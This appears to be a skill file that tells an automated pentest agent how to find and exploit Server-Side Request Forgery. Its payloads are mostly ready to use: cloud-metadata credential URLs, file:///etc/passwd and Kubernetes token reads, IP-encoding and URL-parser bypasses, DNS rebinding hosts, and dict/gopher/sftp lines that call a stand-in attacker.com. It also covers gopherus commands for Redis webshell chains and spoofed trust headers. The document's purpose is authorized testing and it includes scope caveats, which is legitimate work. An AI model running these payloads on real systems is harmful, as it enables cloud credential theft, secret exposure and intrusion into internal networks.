---
name: ssrf-testing
description: End-to-end methodology for an automated pentest agent to discover, confirm, escalate, and report Server-Side Request Forgery (SSRF) — including blind/OOB detection, cloud metadata abuse, filter/allowlist bypass, protocol smuggling, and internal network enumeration.
origin: internal-pentest-agent
authorization_required: true
---

# SSRF Testing

> Authorized testing only. SSRF is one of the highest-impact web bugs because it routes *through the server's network identity and credentials*. Confirm scope before testing, and confirm rules of engagement before pivoting on any cloud credentials you obtain (a benign identity check is usually fine; using the credentials further usually is not, without separate sign-off).

## 1. Surface Discovery — where to look before testing

SSRF is missed most often because testers only try the obvious `url=` parameter. Actively look for these patterns instead of waiting for them:

- **Direct URL params**: `url`, `uri`, `link`, `src`, `href`, `path`, `dest`, `destination`, `redirect`, `redirect_uri`, `return`, `next`, `continue`, `callback`, `webhook`, `feed`, `image`, `avatar`, `logo`, `file`, `document`, `target`, `endpoint`, `host`, `domain`, `site`, `data`, `reference`, `proxy`
- **Indirect feature surfaces** (often unfiltered because devs didn't think of them as "the URL field"):
  - PDF/document/screenshot generators (wkhtmltopdf, Puppeteer, headless Chrome) that render attacker-supplied HTML/URLs
  - "Import from URL" / "fetch remote file" upload options
  - Link preview / unfurling (Slack-style, social card generators)
  - Webhooks and outbound integration configs (CI/CD, payment callbacks, SSO metadata URL fields — e.g. SAML/OIDC `metadata_url`)
  - XML parsers (XXE → SSRF via external entities) and DOCX/ODT/SVG file parsers that resolve external references
  - Server-side image processing libraries fetching remote images by URL
  - URL shorteners and redirect services
  - API integration / "connect your service" flows that ping a user-supplied base URL
  - PDF skill / scraping skill style features where the agent itself accepts a target URL
- **Carriers beyond the query string** — re-test every confirmed or suspected field in all of: query string, form-encoded POST body, JSON body, multipart fields, and HTTP headers. See §6 for the header-fuzzing list. A field that looks filtered in the query string is frequently unfiltered in the JSON body or a header.

---

## 2. Workflow Decision Tree

```
Found a URL-accepting field?
 ├─ Can you see the response? ───────────► §3 Basic (in-band) SSRF
 ├─ No visible response? ────────────────► §4 Blind / OOB SSRF
 └─ Confirmed (either path)?
     ├─ Try cloud metadata immediately ──► §5 Cloud Metadata (CRITICAL impact)
     ├─ Payload filtered/rejected? ───────► §6 Filter Bypass
     ├─ Want raw TCP control? ────────────► §7 Protocol Smuggling (gopher/dict/etc.)
     └─ Want network visibility? ─────────► §8 Internal Port/Service Enumeration
```

Always attempt cloud metadata (§5) as soon as *any* SSRF primitive is confirmed — it's the highest-value pivot and costs only a few extra requests. This tree is per-field; once you're working across more than one confirmed field, see §2.6 for how to combine them instead of treating each in isolation.

---

## 2.5 Confirmation & Response Analysis — READ BEFORE CONFIRMING OR DISMISSING ANY FINDING

This is the step most automated runs get wrong. A real SSRF hit is frequently embedded in a small region of an otherwise-static page, so the *overall* response looks almost identical to baseline. Judging by whole-page similarity produces false negatives. Follow this method for every in-band payload.

### 2.5.1 Establish a baseline and locate the reflection zone (do this first)
- Send a benign control URL you observe (e.g. `http://<oob-listener>/marker-<unique-id>`).
- Record baseline response size **and** find *where* your unique marker appears in the body. That region — the part of the page that changes based on the fetched URL — is the **reflection zone**. All later analysis targets this zone, not the full page.
- If the marker never appears anywhere in the body, treat the target as **blind** and confirm via OOB (§4) + timing, not by content diff.

### 2.5.2 Analyze the reflection zone, not the whole page
For each payload:
1. Extract **only** the reflection zone from the response — not the entire HTML.
2. Diff that zone against the baseline zone.
3. Grep the zone for provider-specific indicator strings (see 2.5.3) and file markers (`root:x:0:0`, `[boot loader]`, `; for 16-bit app support`).
4. Record the byte-size delta vs baseline. **If the size differs, you must explain *what* the extra bytes are.** A "small" delta (even a few hundred bytes) is the injected internal content — it is the signal, never a rounding error to dismiss.

> Anti-pattern to avoid: comparing full-page HTML byte-for-byte, seeing 99%+ similarity, and concluding "no variation, no SSRF." A 99.96%-identical response with an unexplained size delta is *consistent with* a working SSRF whose output is embedded in a static template — investigate the delta, do not dismiss it.

### 2.5.3 Cloud-metadata indicator strings (presence in the reflection zone = confirmation)
- **AWS:** `ami-id`, `ami-launch-index`, `ami-manifest-path`, `instance-id`, `instance-type`, `local-ipv4`, `public-ipv4`, `security-groups`, `availability-zone`, `iam/security-credentials`, `AccessKeyId`, `SecretAccessKey`, `Token`
- **GCP:** `computeMetadata`, `service-accounts`, `project-id`, numeric project id
- **Azure:** `compute`, `azEnvironment`, `vmId`, `subscriptionId`
- **Alibaba / DO / OCI:** `ram/security-credentials`, `region-id`, `droplet_id`, `opc/v2`

### 2.5.4 Verdict logic
| Observation | Verdict |
|---|---|
| Indicator string present in reflection zone | **CONFIRMED** — capture exact value as proof |
| Zone differs and content matches the requested internal resource | **CONFIRMED** |
| OOB callback received | **CONFIRMED** (at minimum blind SSRF) |
| Zone identical to baseline, no callback | Not vulnerable *for this payload* |
| 200 OK but no indicator, no zone diff, no callback | **Not evidence** — a 200 alone proves nothing; continue |

Never report CONFIRMED without a concrete indicator string, matching content, or callback. Never report NOT-VULNERABLE for a payload whose reflection zone or size changed without explaining the change.

---

## 2.6 Cross-Vector Pivoting — pool findings across every field, don't score each one in isolation

Real targets (and well-built test targets) rarely expose one URL-accepting field that does everything. It's far more common to find several, each with a different ceiling: one gives you visible output but only over `http(s)://`, another is blind but reaches further, another only tells you whether a port is open. Treat every field you find in §1 as a distinct primitive with its own capabilities, and actively combine them — don't evaluate a field, exhaust its own bypasses, and move to the next field as if it were a separate target.

Maintain a running, shared picture as you test, not a per-field scratchpad:
- **Confirmed internal hosts/ports** — from port enumeration (§8), banner grabs, or side effects (timing, error-message differences) noticed on *any* field.
- **Content-capable fields** — fields whose response reflects fetched content (§3), even if they're guarded or scheme-limited.
- **Blind-only fields** — confirmable only via OOB (§4) or timing, never give you a body back.
- **Scheme-permissive fields** — anything that dispatches `file://`, `gopher://`, `dict://`, etc. (§7), not just `http(s)://`.

Then cross-apply deliberately:
- A port-scan/enumeration primitive (§8) almost never returns content — its output is a **target list**, not a finding on its own. Re-drive every interesting host:port it surfaces through your best content-capable field (§3) to see what's actually running there.
- If your only working primitive against a given internal target is blind, don't stop at "blind SSRF confirmed" — check whether *any other field* on the same application can reach that same host:port with a visible response, before concluding you can't read its content.
- If a field only speaks `http(s)://` but you've identified a raw TCP service (Redis, Memcached, etc.) through another field or a banner grab, look for a *different* field that's scheme-permissive (§7) to actually exploit it — the discovery and the exploitation primitive don't have to be the same request.
- Don't assume uniform defenses across fields. One field's blocklist bypass, guard, or allowed-scheme list tells you nothing about another field's — each is independently naive or hardened, and a target commonly ships several different half-fixes across its surface (see §6's note on layered checks that each fail differently).

In short: after §1's surface discovery, build one shared map of "what's reachable" and "what each field can do with it," and keep revisiting that map as new fields or new internal hosts turn up — the winning chain is frequently *enumerate with field A, extract with field B*, not everything through one field.

---

## 3. Basic (in-band) SSRF — HIGH

Response is reflected back to you; confirmation is immediate.

```
?url=http://127.0.0.1/
?url=http://localhost/
?url=http://169.254.169.254/latest/meta-data/
?url=file:///etc/passwd
```

**Confirmation signals:** reflected file contents or internal HTML/banners; a response that differs from requesting a known-public URL; distinguishing errors (`connection refused` vs `timeout` vs a real `200`) that prove the server actually attempted the fetch rather than just echoing your input back unprocessed.

**False-positive check:** if the app appears to "fetch" anything you give it (including garbage hostnames) and always returns the same generic error, you may be looking at client-side validation or a cached/templated response, not a real server-side fetch. Confirm with a OOB listener (§4) to be sure a real outbound request occurred.

---

## 4. Blind / Out-of-Band (OOB) SSRF — HIGH

No response shown; confirm via an external listener you control.

```bash
python3 -m http.server 8888        # or
nc -lvp 8888
# or a Collaborator-style service / your own DNS-logging domain
```

```
?url=http://YOUR_SERVER_IP:8888/ssrf-canary-<unique-id>
?url=http://YOUR_LOGGING_DOMAIN/ssrf-canary-<unique-id>
```

- Use a **unique token per test** so you can attribute which field/payload triggered the callback when fuzzing many fields at once.
- Test DNS-only resolution too (`nslookup`/Collaborator DNS hit with no TCP connection) — proves the hostname was resolved server-side even if the outbound connection itself is firewalled. This still demonstrates partial SSRF (useful for DNS rebinding attacks, §6) even if egress is otherwise locked down.
- Try delayed/async triggers: webhooks, "we'll email you when processing completes," queued background jobs — the OOB hit may arrive seconds to minutes later, not synchronously with your request.
- Fuzz every header in §9 with your OOB target, not just body/query parameters.

---

## 5. Cloud Metadata Access — CRITICAL

Pivot here the moment *any* SSRF is confirmed.

**AWS — IMDSv1:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```
**AWS — IMDSv2** requires `PUT` to `/latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds`, then the token as `X-aws-ec2-metadata-token` on the GET. If your SSRF only controls the destination URL (not method or headers), IMDSv2-hardened instances will block this — note it as "metadata access mitigated via IMDSv2" and move on rather than assuming no impact.

**GCP:**
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/hostname
```
Requires `Metadata-Flavor: Google` on the `v1` path. The legacy `v1beta1` path historically didn't require the header — worth trying if you can't control headers.

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```
Requires `Metadata: true` header.

**Alibaba Cloud:**
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/<ROLE_NAME>
```

**DigitalOcean:**
```
http://169.254.169.254/metadata/v1/
```

**Oracle Cloud (OCI):**
```
http://169.254.169.254/opc/v2/instance/   # requires Authorization: Bearer Oracle header in newer configs
http://169.254.169.254/opc/v1/instance/   # legacy, often unauthenticated
```

**Kubernetes** (if `file://` is supported, or the SSRF originates from inside a pod):
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
https://kubernetes.default.svc/api/v1/namespaces/<ns>/secrets
```

**Verifying impact without overstepping scope:** if you obtain temporary credentials, the appropriate proof-of-impact is a read-only identity check (`aws sts get-caller-identity`, `gcloud auth print-access-token` validation, etc.) — not lateral movement, data exfiltration, or resource modification, unless the engagement scope explicitly covers post-exploitation.

---

## 6. Filter / Allowlist Bypass — HIGH

If naive payloads are rejected, the target is likely doing string or regex matching on the host. Different bypass families exploit different layers — work through all of them, not just the first one that seems plausible:

### 6a. IP encoding (defeats string/regex filters that only recognize dotted-decimal `127.0.0.1`)
```
http://2130706433/                 # decimal
http://0x7f000001/                 # hex
http://0177.0.0.01/                # octal
http://017700000001/               # full octal
http://127.1/                      # short form
http://0/                          # resolves to 127.0.0.1 on many stacks
http://0.0.0.0/
http://[::1]/                      # IPv6 loopback
http://[::ffff:127.0.0.1]/         # IPv4-mapped IPv6
http://127.0.0x0.1/                # mixed-base octets
```
Common blocked-range regexes to specifically probe for off-by-one errors:
```
^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$
^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
```
Try boundary values these regexes commonly mishandle: `172.32.x.x` (just outside the `172.16-31` private range — should be public, may be incorrectly blocked or, more interestingly, the inverse off-by-one that lets a private IP slip through), and malformed-but-valid-to-some-parsers octets like `192.168.00001.1`.

### 6b. URL parser confusion (defeats allowlists that check only part of the URL)

> `<PARAM>` is a placeholder for *whatever field actually carries the URL* on the target — not necessarily literally named `url`. Apply every payload below to query string, form-encoded body, JSON body, and headers alike (see real-carrier examples after the payload list).

```
http://attacker.com@127.0.0.1/             # userinfo trick — naive parser may check "attacker.com"
http://127.0.0.1#@attacker.com/            # fragment trick
http://127.0.0.1.attacker.com/             # subdomain trick — substring match on "attacker.com" passes
http://attacker.com\@127.0.0.1/            # backslash confusion
<PARAM>=/www.evil.com                      # single-slash — parsed as relative path, not absolute URL, by some libs
<PARAM>=//www.evil.com                     # protocol-relative
<PARAM>=///evil.com                        # multi-slash prefix
<PARAM>=////evil.com
<PARAM>=https://legit.com@evil.com
<PARAM>=https://evil.com#legit.com
<PARAM>=https://evil.com?legit.com
<PARAM>=https://evil.com\\legit.com
```

Real carriers `<PARAM>` might be:
```
# Query string
GET /fetch?url=https://legit.com@evil.com

# Form-encoded POST body
POST /webhook
Content-Type: application/x-www-form-urlencoded
callback_url=https://legit.com@evil.com

# JSON POST body
POST /api/import
Content-Type: application/json
{"source": "https://legit.com@evil.com"}

# Header
X-Forwarded-Host: legit.com@evil.com
```

### 6c. DNS rebinding (defeats one-time "resolve and validate, then fetch separately" checks — exploits the TOCTOU gap)
```
http://127.0.0.1.nip.io/
http://127-0-0-1.sslip.io/
http://<hex>.rbndr.us/             # alternates between two configured IPs per DNS query
```
Most effective when validation and fetch happen as two distinct steps with any time gap (validation in app code, fetch handled later by a separate HTTP client/library, queued job, etc.).

### 6d. Open redirect chaining (defeats host allowlists that only check the initial request)
```
http://allowlisted-domain.com/some/open/redirect?url=http://169.254.169.254/
```
If the fetching HTTP client follows redirects, find any open redirect on an allowlisted domain and chain through it to an internal target. Also worth testing: does the allowlist check apply to redirect targets at all, or only the first hop?

**Combining with 6a:** a naive substring blocklist is frequently applied to the *entire submitted URL string*, not just to whatever the fetcher ultimately connects to — so if your internal target is embedded unencoded inside the outer request (e.g. as the redirect's `?to=` value), it can still trip the filter even though "the redirect target itself is never re-validated" is true. When chaining redirect-bypass with a blocklist, encode the nested/final target (6a) *in addition to* using the redirect hop — encoding only one of the two often still fails.

### 6e. Scheme/case/encoding tricks
```
HTTP://127.0.0.1/                  # case bypass on naive scheme checks
hTtp://127.0.0.1/
http://127.0.0.1:80@evil.com/      # port + userinfo combo
http://127。0。0。1/                 # fullwidth dot (U+3002) — some Unicode-normalizing parsers treat as "."
url=%2F%2F127.0.0.1                # URL-encoded slashes if input passes through one decode layer the filter doesn't
```

---

## 7. Protocol / Scheme Smuggling — HIGH

If `http(s)://` is blocked, or to escalate beyond a simple GET, test whether the underlying HTTP client library supports other schemes:

```
file:///etc/passwd
file:///C:/Windows/win.ini
dict://127.0.0.1:6379/INFO              # Redis INFO via DICT
dict://attacker.com:1337/               # confirm DICT support via callback
sftp://attacker.com:1337/               # SSH banner grab via callback
ldap://127.0.0.1:1337/%0astats%0aquit
ldaps://127.0.0.1:1337/%0astats%0aquit
tftp://attacker.com:1337/TESTUDPPACKET
gopher://127.0.0.1:6379/_INFO           # Redis
gopher://127.0.0.1:3306/_               # MySQL handshake probe
ftp://127.0.0.1/
```

**Gopher** is the most powerful: it lets you push an arbitrary raw byte stream to an internal TCP service, which enables Redis `CONFIG SET`/webshell-write chains, SMTP command injection, or smuggling a full raw HTTP request to an internal-only API the SSRF wouldn't otherwise let you address directly.

Recommended order: confirm which callback-capable schemes (`dict`, `sftp`, `tftp`, `ldap`) the server's HTTP client actually dispatches first, using a plain listener (`nc -lvp 1337`), *before* investing time building a complex gopher payload for a specific internal service — there's no point crafting a Redis exploit chain if the client library doesn't support gopher at all.

```bash
# Generate gopher payloads for known services rather than hand-building byte streams
gopherus --exploit redis
gopherus --exploit mysql
gopherus --exploit fastcgi
gopherus --exploit smtp
```

**If a gopher/protocol-smuggling payload appears to silently fail** (empty response, hangs until timeout, or garbled partial data) when submitted through a normal application parameter (as opposed to a raw socket you control directly) — don't conclude the target doesn't support the scheme yet. The value typically passes through at least one decode layer (the web framework's own query/body parsing) before your chosen HTTP client ever sees it, and many URL-parsing libraries additionally strip raw CR/LF from URLs outright as CRLF-injection hardening. A single-encoded `%0d%0a` often gets decoded to a real CRLF *before* it reaches the vulnerable fetcher, and then gets silently stripped by URL parsing before the byte stream is ever sent. Try progressively deeper encoding (`%250d%250a`, i.e. encode the `%` itself) so the control characters only materialize after all intermediate parsing has already happened — this is exactly what `gopherus`-generated payloads do, which is part of why using the tool's output verbatim tends to work when a hand-typed single-encoded version doesn't.

**Multi-command chains must land in one connection.** Stateful protocols (Redis, and most raw TCP services this technique targets) evaluate commands within the scope of a single connection/session — a `CONFIG SET dir` sent as one request and `SAVE` sent as a separate one won't chain if the target opens a fresh connection per request (which is exactly what happens if your delivery mechanism re-fetches the URL per command). Pack the full command sequence into one payload/one connection, the way `gopherus`'s output already does.

---

## 8. Internal Port / Service Enumeration — MEDIUM

Once any SSRF primitive works, repurpose it as a blind network scanner. This step produces a target list, not a finding by itself — see §2.6 for feeding what you find here into whichever field can actually extract content.

```
http://127.0.0.1:<PORT>/
```
Sweep: 22 (SSH), 80/443, 3306 (MySQL), 5432 (Postgres), 6379 (Redis), 8080/8443 (alt HTTP / admin panels), 9200 (Elasticsearch), 27017 (MongoDB), 2375 (Docker API), 8500 (Consul), 11211 (Memcached), 10250 (Kubelet), 5000/5601 (common app/Kibana ports), 9000 (PHP-FPM/Portainer/etc).

**Distinguishing open / closed / filtered without direct output:**
- **Timing**: `connection refused` (closed) returns fast; a held-open TCP connection to a live non-HTTP service hangs until the client's own timeout — a measurable delta from closed ports.
- **Error text differences**: "connection refused" vs "timeout" vs an actual upstream HTTP error vs raw protocol banner bytes leaking into the response.
- **Content-length / status-code deltas** between ports, even in fully blind scenarios.

Known fingerprints worth requesting directly once a port responds:
```
http://127.0.0.1:9200/_cat/indices       # Elasticsearch — unauthenticated index listing
http://127.0.0.1:2375/containers/json    # Docker API — potential container/host takeover if writable
http://127.0.0.1:8500/v1/kv/?recurse     # Consul KV — secrets frequently stored here
http://127.0.0.1:10250/pods/             # Kubelet — pod enumeration / exec risk
http://127.0.0.1:11211/                  # Memcached — try a `stats` command via raw protocol if gopher available
```

---

## 9. Header Fuzzing Reference

When parameter-based SSRF is blocked but the app sits behind a load balancer or implements custom IP-trust/debug logic, fuzz every header below with internal IPs and your OOB listener — many frameworks trust these for IP allowlisting, debug "fetch this URL" features, or virtual-host routing:

`Base-Url`, `Client-IP`, `Http-Url`, `Proxy-Host`, `Proxy-Url`, `Real-Ip`, `Redirect`, `Referer` / `Referrer` / `Refferer`, `Request-Uri`, `Uri`, `Url`, `X-Client-IP`, `X-Custom-IP-Authorization`, `X-Forward-For`, `X-Forwarded-By`, `X-Forwarded-For`, `X-Forwarded-For-Original`, `X-Forwarded-Host`, `X-Forwarded-Port`, `X-Forwarded-Scheme`, `X-Forwarded-Server`, `X-Forwarded`, `X-Forwarder-For`, `X-Host`, `X-Http-Destinationurl`, `X-Http-Host-Override`, `X-Original-Remote-Addr`, `X-Original-Url`, `X-Originating-IP`, `X-Proxy-Url`, `X-Real-Ip`, `X-Remote-Addr`, `X-Remote-IP`, `X-Rewrite-Url`, `X-True-IP`.

**Don't stop at IP-spoofing headers.** Everything above carries a spoofed *address*, on the assumption the app trusts a proxy's claim about who the client is. A distinct and equally common pattern is a boolean/flag header the app trusts as "this request came from inside our own infrastructure" — no IP involved at all: `X-Internal-Request`, `X-Internal`, `X-Debug`, `X-Debug-Mode`, `X-Admin-Override`, `X-Bypass-Auth`, `X-Trusted-Request`, `X-Service-Internal`. These show up on services sitting behind an API gateway or service mesh that adds such a header itself and never expects to be reachable any other way — if the service is ever directly reachable (including via SSRF), the header is just as forgeable as any of the IP ones. Fuzz truthy values (`true`, `1`, `yes`, `internal`) the same way you'd fuzz an IP value on the headers above.

Send each header with the value `127.0.0.1` first as a baseline probe (does behavior change at all vs. omitting it?), then escalate to your OOB listener address and metadata IPs for any header that visibly changes server behavior.

---

## 10. Severity & Reporting

Score and document each confirmed finding:

| Signal | Severity guidance |
|---|---|
| Reaches cloud metadata, credentials retrievable | Critical |
| Reaches internal-only admin APIs (Docker, Consul, Kubelet, Elasticsearch) with data exposure | High–Critical |
| Reaches internal services but no direct data exposure (e.g. port enumeration only) | Medium–High |
| Blind SSRF confirmed via OOB only, no internal pivot demonstrated yet | Medium, escalate if time allows |
| SSRF confirmed but mitigated by IMDSv2/strict allowlist with no bypass found | Low/Informational — still report, filters can regress |

For every confirmed finding, record: exact payload and exact carrier (parameter name, body location, or header), in-band vs. blind, what internal resource was reached, whether credentials/secrets were exposed and their verified scope (read-only identity check only — don't pivot further without separate authorization), and which bypass technique (if any) defeated existing filtering. This maps each finding back to one of the categories in §3–§8 for tracking against a checklist.

## 11. Common Pitfalls (false positives / false negatives to avoid)

- **Don't judge SSRF by whole-page similarity or full-HTML byte comparison.** The injected content is usually a small region inside a static template, so a working SSRF can look 99%+ identical to baseline. Extract and analyze the reflection zone per §2.5, and treat any unexplained size delta as content to investigate, not noise to dismiss.
- **A 200 OK is not evidence.** Confirmation requires an indicator string, matching internal content, or an OOB callback (§2.5.4) — not a status code.
- Don't conclude "no SSRF" after only testing the `url` query parameter — re-test via §1's surface list and §9's headers before ruling it out.
- A generic "invalid URL" error on *every* input (including obviously well-formed URLs) usually means client-side or pre-validation rejection, not a confirmed-safe server — try OOB confirmation before trusting the error message.
- IMDSv2 blocking simple GET-based metadata requests does not mean metadata is fully unreachable — note it as mitigated for the simple case, but check whether the app exposes any way to set custom headers/methods on the proxied request.
- A blind SSRF with no internal pivot demonstrated yet is still a real finding — report it as confirmed (via OOB) even if you run out of time to escalate to metadata or internal services.
